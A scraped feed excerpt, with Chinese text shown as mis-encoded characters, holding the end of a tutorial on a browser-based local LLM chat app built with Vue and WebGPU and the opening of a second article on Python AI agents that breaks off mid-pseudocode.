    <span class="hljs-attr">description</span>: <span class="hljs-string">"æ€§èƒ½å¼ºå¤§ï¼Œå“åº”è´¨é‡é«˜ï¼Œéœ€è¦æ›´å¤šèµ„æº"</span>,
  },
  {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"Phi-3.5-mini-instruct-q4f16_1-MLC"</span>,
    <span class="hljs-attr">displayName</span>: <span class="hljs-string">"Phi 3.5 Mini (å‡è¡¡)"</span>,
    <span class="hljs-attr">description</span>: <span class="hljs-string">"å¾®è½¯å‡ºå“ï¼Œæ€§èƒ½ä¸é€Ÿåº¦å‡è¡¡"</span>,
  },
] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>;
</code></pre>
<p><strong>æ¨¡å‹åˆ‡æ¢é€»è¾‘</strong>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">switchModel</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">modelName: <span class="hljs-built_in">string</span></span>) =&gt; {
  <span class="hljs-keyword">if</span> (isGenerating.<span class="hljs-property">value</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"æ­£åœ¨ç”Ÿæˆå›å¤ï¼Œæ— æ³•åˆ‡æ¢æ¨¡å‹"</span>);
  }

  <span class="hljs-comment">// æ›´æ–°é…ç½®</span>
  config.<span class="hljs-property">value</span>.<span class="hljs-property">modelConfig</span>.<span class="hljs-property">modelName</span> = modelName;
  <span class="hljs-title function_">saveConfig</span>(config.<span class="hljs-property">value</span>);

  <span class="hljs-comment">// é‡ç½®å¼•æ“çŠ¶æ€</span>
  isLoaded.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
  loadProgress.<span class="hljs-property">value</span> = <span class="hljs-number">0</span>;
  engine = <span class="hljs-literal">null</span>;

  <span class="hljs-comment">// é‡æ–°åˆå§‹åŒ–</span>
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">initEngine</span>();
};
</code></pre>
<hr/>
<h4 data-id="heading-15">3.4 æœ¬åœ°å­˜å‚¨ä¸çŠ¶æ€æŒä¹…åŒ–</h4>
<p>ä¸ºäº†æä¾›è‰¯å¥½çš„ç”¨æˆ·ä½“éªŒï¼Œåº”ç”¨ä¼šè‡ªåŠ¨ä¿å­˜ï¼š</p>
<ul>
<li>ğŸ“ å¯¹è¯å†å²</li>
<li>âš™ï¸ ç”¨æˆ·é…ç½®ï¼ˆæ¨¡å‹é€‰æ‹©ã€æ¸©åº¦ç­‰å‚æ•°ï¼‰</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/utils/storage.ts (ç¤ºä¾‹)</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">STORAGE_KEYS</span> = {
  <span class="hljs-attr">CHAT_HISTORY</span>: <span class="hljs-string">"local-llm-chat-history"</span>,
  <span class="hljs-attr">CONFIG</span>: <span class="hljs-string">"local-llm-config"</span>,
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">saveChatHistory</span>(<span class="hljs-params">messages: Message[]</span>) {
  <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-variable constant_">STORAGE_KEYS</span>.<span class="hljs-property">CHAT_HISTORY</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(messages));
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadChatHistory</span>(<span class="hljs-params"/>): <span class="hljs-title class_">Message</span>[] {
  <span class="hljs-keyword">const</span> data = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-variable constant_">STORAGE_KEYS</span>.<span class="hljs-property">CHAT_HISTORY</span>);
  <span class="hljs-keyword">return</span> data ? <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(data) : [];
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">saveConfig</span>(<span class="hljs-params">config: AppConfig</span>) {
  <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-variable constant_">STORAGE_KEYS</span>.<span class="hljs-property">CONFIG</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(config));
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadConfig</span>(<span class="hljs-params"/>): <span class="hljs-title class_">AppConfig</span> | <span class="hljs-literal">null</span> {
  <span class="hljs-keyword">const</span> data = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-variable constant_">STORAGE_KEYS</span>.<span class="hljs-property">CONFIG</span>);
  <span class="hljs-keyword">return</span> data ? <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(data) : <span class="hljs-literal">null</span>;
}
</code></pre>
<hr/>
<h3 data-id="heading-16">å››ã€ç”¨æˆ·ä½“éªŒä¼˜åŒ–</h3>
<h4 data-id="heading-17">4.1 å“åº”å¼è®¾è®¡</h4>
<p>åº”ç”¨é‡‡ç”¨ç°ä»£ CSS æŠ€æœ¯å®ç°ç²¾ç¾çš„ç•Œé¢ï¼š</p>
<ul>
<li><strong>æ¸å˜èƒŒæ™¯</strong>ï¼šå¤šå±‚æ¬¡ç´«è‰²æ¸å˜è¥é€ æ²‰æµ¸æ„Ÿ</li>
<li><strong>æ¯›ç»ç’ƒæ•ˆæœ</strong>ï¼š<code>backdrop-filter: blur(10px)</code> å®ç°åŠé€æ˜æ¨¡ç³Š</li>
<li><strong>åŠ¨ç”»æ•ˆæœ</strong>ï¼šåŠ è½½åŠ¨ç”»ã€æ‚¬åœæ•ˆæœã€çŠ¶æ€æŒ‡ç¤ºå™¨è„‰å†²</li>
</ul>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* src/components/ChatTerminal.vue */</span>
<span class="hljs-selector-class">.chat-terminal</span> {
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">135deg</span>, <span class="hljs-number">#0f0c29</span> <span class="hljs-number">0%</span>, <span class="hljs-number">#302b63</span> <span class="hljs-number">50%</span>, <span class="hljs-number">#24243e</span> <span class="hljs-number">100%</span>);
  backdrop-<span class="hljs-attribute">filter</span>: <span class="hljs-built_in">blur</span>(<span class="hljs-number">10px</span>);
}

<span class="hljs-selector-class">.status-dot</span> {
  <span class="hljs-attribute">animation</span>: pulse <span class="hljs-number">2s</span> infinite;
}

<span class="hljs-keyword">@keyframes</span> pulse {
  <span class="hljs-number">0%</span>,
  <span class="hljs-number">100%</span> {
    <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>;
  }
  <span class="hljs-number">50%</span> {
    <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.5</span>;
  }
}
</code></pre>
<h4 data-id="heading-18">4.2 è‡ªåŠ¨æ»šåŠ¨</h4>
<p>ä½¿ç”¨ Vue çš„ <code>watch</code> ç›‘å¬æ¶ˆæ¯å˜åŒ–ï¼Œè‡ªåŠ¨æ»šåŠ¨åˆ°åº•éƒ¨ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç›‘å¬æ¶ˆæ¯æ•°é‡å˜åŒ–</span>
<span class="hljs-title function_">watch</span>(
  <span class="hljs-function">() =&gt;</span> messages.<span class="hljs-property">value</span>.<span class="hljs-property">length</span>,
  <span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">nextTick</span>();
    <span class="hljs-keyword">if</span> (viewport.<span class="hljs-property">value</span>) {
      viewport.<span class="hljs-property">value</span>.<span class="hljs-property">scrollTop</span> = viewport.<span class="hljs-property">value</span>.<span class="hljs-property">scrollHeight</span>;
    }
  }
);

<span class="hljs-comment">// ç›‘å¬æµå¼ç”Ÿæˆæ—¶çš„å†…å®¹å˜åŒ–</span>
<span class="hljs-title function_">watch</span>(
  <span class="hljs-function">() =&gt;</span> messages.<span class="hljs-property">value</span>[messages.<span class="hljs-property">value</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>]?.<span class="hljs-property">content</span>,
  <span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">nextTick</span>();
    <span class="hljs-keyword">if</span> (viewport.<span class="hljs-property">value</span> &amp;&amp; isGenerating.<span class="hljs-property">value</span>) {
      viewport.<span class="hljs-property">value</span>.<span class="hljs-property">scrollTop</span> = viewport.<span class="hljs-property">value</span>.<span class="hljs-property">scrollHeight</span>;
    }
  }
);
</code></pre>
<h4 data-id="heading-19">4.3 åŠ è½½è¿›åº¦åé¦ˆ</h4>
<p>æ¨¡å‹åŠ è½½æ˜¯ä¸ªè€—æ—¶è¿‡ç¨‹ï¼ˆé€šå¸¸ 1-5 åˆ†é’Ÿï¼‰ï¼Œç²¾å¿ƒè®¾è®¡çš„åŠ è½½ç•Œé¢è‡³å…³é‡è¦ï¼š</p>
<pre><code class="hljs language-vue" lang="vue">&lt;div v-if="!isLoaded" class="loading-screen"&gt;
  &lt;div class="loading-content"&gt;
    &lt;div class="loading-icon"&gt;âš¡&lt;/div&gt;
    &lt;h2 class="loading-title"&gt;
      {{ loadError ? "åŠ è½½å¤±è´¥" : "æ­£åœ¨åŠ è½½æ¨¡å‹" }}
    &lt;/h2&gt;

    &lt;div v-if="!loadError" class="progress-container"&gt;
      &lt;div class="progress-bar"&gt;
        &lt;div class="progress-fill" :style="{ width: loadProgress + '%' }"&gt;&lt;/div&gt;
      &lt;/div&gt;
      &lt;div class="progress-info"&gt;
        &lt;span class="progress-percent"&gt;{{ loadProgress }}%&lt;/span&gt;
        &lt;span class="progress-status"&gt;{{ loadStatus }}&lt;/span&gt;
      &lt;/div&gt;
    &lt;/div&gt;

    &lt;div v-else class="error-message"&gt;
      &lt;p&gt;âŒ {{ loadError }}&lt;/p&gt;
      &lt;p class="error-hint"&gt;
        è¯·ç¡®ä¿ä½¿ç”¨æ”¯æŒ WebGPU çš„æµè§ˆå™¨ï¼ˆChrome/Edge æœ€æ–°ç‰ˆï¼‰
      &lt;/p&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;
</code></pre>
<hr/>
<h3 data-id="heading-20">äº”ã€æŠ€æœ¯äº®ç‚¹ä¸åˆ›æ–°</h3>
<h4 data-id="heading-21">5.1 å®Œå…¨ç¦»çº¿è¿è¡Œ</h4>
<p>ä¸€æ—¦æ¨¡å‹åŠ è½½å®Œæˆï¼Œåº”ç”¨å¯ä»¥<strong>å®Œå…¨ç¦»çº¿ä½¿ç”¨</strong>ã€‚æ‰€æœ‰è®¡ç®—å‡åœ¨æœ¬åœ°å®Œæˆï¼Œæ— éœ€ä»»ä½•ç½‘ç»œè¯·æ±‚ï¼ˆé™¤é¦–æ¬¡åŠ è½½æ¨¡å‹æ–‡ä»¶ï¼‰ã€‚</p>
<h4 data-id="heading-22">5.2 éšç§ä¿æŠ¤</h4>
<ul>
<li>âœ… å¯¹è¯å†…å®¹ä¸ä¸Šä¼ ä»»ä½•æœåŠ¡å™¨</li>
<li>âœ… æœ¬åœ°å­˜å‚¨é‡‡ç”¨æµè§ˆå™¨ <code>localStorage</code></li>
<li>âœ… ç”¨æˆ·æ‹¥æœ‰æ•°æ®çš„å®Œå…¨æ§åˆ¶æƒ</li>
</ul>
<h4 data-id="heading-23">5.3 é«˜æ€§èƒ½æ¨ç†</h4>
<p>é€šè¿‡ WebGPUï¼š</p>
<ul>
<li>âš¡ åˆ©ç”¨ GPU å¹¶è¡Œè®¡ç®—èƒ½åŠ›</li>
<li>âš¡ é‡åŒ–æ¨¡å‹ï¼ˆq4f32_1ï¼‰å‡å°‘å†…å­˜å ç”¨</li>
<li>âš¡ æ¨ç†é€Ÿåº¦å¯è¾¾ 10-30 tokens/ç§’ï¼ˆå–å†³äºç¡¬ä»¶ï¼‰</li>
</ul>
<h4 data-id="heading-24">5.4 çµæ´»çš„é…ç½®</h4>
<p>ç”¨æˆ·å¯è°ƒæ•´ï¼š</p>
<ul>
<li>ğŸ›ï¸ <strong>Temperature</strong>ï¼šæ§åˆ¶è¾“å‡ºçš„éšæœºæ€§</li>
<li>ğŸ›ï¸ <strong>Top P</strong>ï¼šæ ¸é‡‡æ ·å‚æ•°</li>
<li>ğŸ›ï¸ <strong>Max Tokens</strong>ï¼šæœ€å¤§ç”Ÿæˆé•¿åº¦</li>
<li>ğŸ›ï¸ <strong>System Prompt</strong>ï¼šè‡ªå®šä¹‰ AI è§’è‰²</li>
</ul>
<hr/>
<h3 data-id="heading-25">å…­ã€æŒ‘æˆ˜ä¸è§£å†³æ–¹æ¡ˆ</h3>
<h4 data-id="heading-26">6.1 æŒ‘æˆ˜ï¼šæµè§ˆå™¨å…¼å®¹æ€§</h4>
<p><strong>é—®é¢˜</strong>ï¼šWebGPU æ˜¯è¾ƒæ–°çš„æŠ€æœ¯ï¼Œä»…åœ¨æœ€æ–°ç‰ˆæœ¬çš„ Chrome å’Œ Edge ä¸­å®Œå…¨æ”¯æŒã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<ul>
<li>å¯åŠ¨æ—¶æ£€æµ‹ <code>navigator.gpu</code> æ˜¯å¦å¯ç”¨</li>
<li>æä¾›æ¸…æ™°çš„é”™è¯¯æç¤ºå’Œæµè§ˆå™¨å‡çº§å»ºè®®</li>
</ul>
<h4 data-id="heading-27">6.2 æŒ‘æˆ˜ï¼šé¦–æ¬¡åŠ è½½æ—¶é—´</h4>
<p><strong>é—®é¢˜</strong>ï¼šæ¨¡å‹æ–‡ä»¶ä½“ç§¯è¾ƒå¤§ï¼ˆ1.5B æ¨¡å‹çº¦ 1GBï¼‰ï¼Œé¦–æ¬¡åŠ è½½è€—æ—¶é•¿ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<ul>
<li>å®æ—¶æ˜¾ç¤ºåŠ è½½è¿›åº¦ï¼ˆç™¾åˆ†æ¯” + çŠ¶æ€æ–‡æœ¬ï¼‰</li>
<li>æ¨¡å‹æ–‡ä»¶ç¼“å­˜åœ¨æµè§ˆå™¨ä¸­ï¼ˆIndexedDBï¼‰ï¼Œåç»­è®¿é—®æ— éœ€é‡æ–°ä¸‹è½½</li>
<li>æä¾›å¤šç§è§„æ¨¡çš„æ¨¡å‹ä¾›ç”¨æˆ·é€‰æ‹©</li>
</ul>
<h4 data-id="heading-28">6.3 æŒ‘æˆ˜ï¼šå†…å­˜ç®¡ç†</h4>
<p><strong>é—®é¢˜</strong>ï¼šé•¿æ—¶é—´å¯¹è¯å¯èƒ½å¯¼è‡´å†…å­˜å ç”¨è¿‡é«˜ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<ul>
<li>æä¾›æ¸…ç©ºå¯¹è¯åŠŸèƒ½é‡Šæ”¾å†…å­˜</li>
<li>é™åˆ¶ <code>max_tokens</code> é¿å…ç”Ÿæˆè¿‡é•¿æ–‡æœ¬</li>
</ul>
<hr/>
<h3 data-id="heading-29">ä¸ƒã€æœªæ¥å±•æœ›</h3>
<ol>
<li><strong>æ›´å¤šæ¨¡å‹æ”¯æŒ</strong>ï¼šé›†æˆæ›´å¤šå¼€æºæ¨¡å‹ï¼ˆå¦‚ Mistralã€Gemmaï¼‰</li>
<li><strong>å¤šæ¨¡æ€èƒ½åŠ›</strong>ï¼šæ”¯æŒå›¾åƒç†è§£ï¼ˆè§†è§‰è¯­è¨€æ¨¡å‹ï¼‰</li>
<li><strong>RAG å¢å¼º</strong>ï¼šæœ¬åœ°çŸ¥è¯†åº“æ£€ç´¢å¢å¼ºç”Ÿæˆ</li>
<li><strong>è¯­éŸ³äº¤äº’</strong>ï¼šé›†æˆ Web Speech API å®ç°è¯­éŸ³å¯¹è¯</li>
<li><strong>PWA æ”¯æŒ</strong>ï¼šå®‰è£…ä¸ºæ¡Œé¢åº”ç”¨</li>
</ol>
<hr/>
<h3 data-id="heading-30">å…«ã€æ€»ç»“</h3>
<p><strong>Local LLM</strong> é¡¹ç›®å±•ç¤ºäº†ç°ä»£ Web æŠ€æœ¯çš„æƒŠäººèƒ½åŠ›ï¼šé€šè¿‡ WebGPUï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æµè§ˆå™¨ä¸­è¿è¡ŒçœŸæ­£çš„å¤§è¯­è¨€æ¨¡å‹ï¼Œæä¾›æ¥è¿‘åŸç”Ÿåº”ç”¨çš„æ€§èƒ½ã€‚è¿™ä¸ä»…æ˜¯å¯¹éšç§ä¿æŠ¤çš„æ‰¿è¯ºï¼Œæ›´æ˜¯å¯¹æœªæ¥ AI åº”ç”¨å½¢æ€çš„æ¢ç´¢ã€‚</p>
<p>éšç€ WebGPU ç”Ÿæ€çš„æˆç†Ÿå’Œæµè§ˆå™¨æ€§èƒ½çš„æŒç»­æå‡ï¼Œ<strong>æœ¬åœ°åŒ– AI åº”ç”¨</strong>å°†æˆä¸ºé‡è¦è¶‹åŠ¿ï¼Œä¸ºç”¨æˆ·æä¾›æ—¢å¼ºå¤§åˆå®‰å…¨çš„æ™ºèƒ½ä½“éªŒã€‚</p>
<hr/>
<h3 data-id="heading-31">é™„å½•ï¼šå¿«é€Ÿå¼€å§‹</h3>
<h4 data-id="heading-32">å®‰è£…ä¾èµ–</h4>
<pre><code class="hljs language-bash" lang="bash">npm install
</code></pre>
<h4 data-id="heading-33">å¼€å‘è¿è¡Œ</h4>
<pre><code class="hljs language-bash" lang="bash">npm run dev
</code></pre>
<h4 data-id="heading-34">æ„å»ºéƒ¨ç½²</h4>
<pre><code class="hljs language-bash" lang="bash">npm run build
</code></pre>
<h4 data-id="heading-35">ç³»ç»Ÿè¦æ±‚</h4>
<ul>
<li>Chrome/Edge 113+ (æ”¯æŒ WebGPU)</li>
<li>è‡³å°‘ 8GB RAM</li>
<li>æ”¯æŒ WebGPU çš„ç‹¬ç«‹/é›†æˆæ˜¾å¡</li>
</ul>
<hr/>
<h3 data-id="heading-36">å‚è€ƒèµ„æº</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmlc.ai%2Fmlc-llm%2F" target="_blank" title="https://mlc.ai/mlc-llm/" ref="nofollow noopener noreferrer">MLC LLM å®˜æ–¹æ–‡æ¡£</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.w3.org%2FTR%2Fwebgpu%2F" target="_blank" title="https://www.w3.org/TR/webgpu/" ref="nofollow noopener noreferrer">WebGPU è§„èŒƒ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fvuejs.org%2F" target="_blank" title="https://vuejs.org/" ref="nofollow noopener noreferrer">Vue 3 æ–‡æ¡£</a></li>
</ul>
<hr/>
<blockquote>
<p>ğŸ’¡ æç¤ºï¼šé¦–æ¬¡è¿è¡Œéœ€è¦ä¸‹è½½æ¨¡å‹æ–‡ä»¶ï¼Œè¯·è€å¿ƒç­‰å¾…ã€‚å»ºè®®åœ¨ Wi-Fi ç¯å¢ƒä¸‹ä½¿ç”¨ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ™ºèƒ½ä½“æ¥äº†ï¼šä» Python å¼€å‘è€…è§†è§’æ·±åº¦å‰–æä¸å®è·µ]]></title>    <link>https://juejin.cn/post/7594103243686379563</link>    <guid>https://juejin.cn/post/7594103243686379563</guid>    <pubDate>2026-01-13T01:15:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594103243686379563" data-draft-id="7594103243686363179" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" æ™ºèƒ½ä½“æ¥äº†ï¼šä» Python å¼€å‘è€…è§†è§’æ·±åº¦å‰–æä¸å®è·µ"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-13T01:15:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ”¶èœç¦æ˜Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/3247297428981530"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             æ™ºèƒ½ä½“æ¥äº†ï¼šä» Python å¼€å‘è€…è§†è§’æ·±åº¦å‰–æä¸å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3247297428981530/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ”¶èœç¦æ˜Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:15:55.000Z" title="Tue Jan 13 2026 01:15:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€ï¼šä» API è°ƒç”¨è€…åˆ° Agent æ¶æ„å¸ˆ</h2>
<p>åœ¨è¿‡å»çš„ä¸€å¹´é‡Œï¼Œå¤§å¤šæ•°å¼€å‘è€…å¯¹ AI çš„ä½¿ç”¨è¿˜åœç•™åœ¨â€œå†™å¥½ Promptï¼Œè°ƒç”¨ APIï¼Œè·å– Responseâ€çš„é˜¶æ®µã€‚ä½†éšç€æ™ºèƒ½ä½“ï¼ˆAgentï¼‰æ¦‚å¿µçš„è½åœ°ï¼Œæˆ‘ä»¬å‘ç° Python åœ¨ AI æ—¶ä»£çš„åœ°ä½å†æ¬¡å‘ç”Ÿäº†è´¨å˜ã€‚</p>
<p>æ™ºèƒ½ä½“ä¸å†ä»…ä»…æ˜¯æ¨¡å‹çš„å°è£…ï¼Œå®ƒæ˜¯ä¸€å¥—<strong>åŸºäºä»£ç çš„å·¥ç¨‹ç³»ç»Ÿ</strong>ã€‚ä½œä¸ºä¸€å Python å¼€å‘è€…ï¼Œç†è§£æ™ºèƒ½ä½“ä¸åº”åœç•™åœ¨å…¶â€œèªæ˜â€çš„è¡¨è±¡ï¼Œè€Œåº”æ·±å…¥å…¶åº•å±‚çš„å¾ªç¯ï¼ˆLoopï¼‰ã€çŠ¶æ€ï¼ˆStateï¼‰å’Œå·¥å…·é“¾ï¼ˆToolchainï¼‰ã€‚</p>
<h2 data-id="heading-1">ç¬¬ä¸€ç« ï¼šæ™ºèƒ½ä½“çš„ Python éª¨æ¶ï¼šæ ¸å¿ƒæ¶æ„çš„å·¥ç¨‹åŒ–</h2>
<p>åœ¨ Python çš„è§†è§’ä¸‹ï¼Œä¸€ä¸ª Agent å®é™…ä¸Šæ˜¯ä¸€ä¸ª<strong>æ— é™æˆ–æœ‰é™çš„ While å¾ªç¯</strong>ã€‚</p>
<h3 data-id="heading-2">1.1 æ ¸å¿ƒå¾ªç¯é€»è¾‘</h3>
<p>æœ€åŸºç¡€çš„ Agent é€»è¾‘å¯ä»¥ç”¨ä»¥ä¸‹ä¼ªä»£ç è¡¨ç¤ºï¼š</p>
<pre><code class="hljs language-ini" lang="ini">def simple_agent(user_goal):
 Â   <span class="hljs-attr">context</span> = []
 Â   while not task_completed:
 Â  Â  Â   <span class="hljs-comment"># 1. æ€è€ƒï¼šLLM åˆ†æå½“å‰ contextï¼Œå†³å®šä¸‹ä¸€æ­¥</span>
 Â  Â  Â   <span class="hljs-attr">thought</span> = llm.generate_thought(user_goal, context)
 Â  Â  Â  Â 
 Â  Â  Â   <span class="hljs-comment"># 2. è¡ŒåŠ¨ï¼šå¦‚æœéœ€è¦å·¥å…·ï¼Œæ‰§è¡Œ Python å‡½æ•°</span>
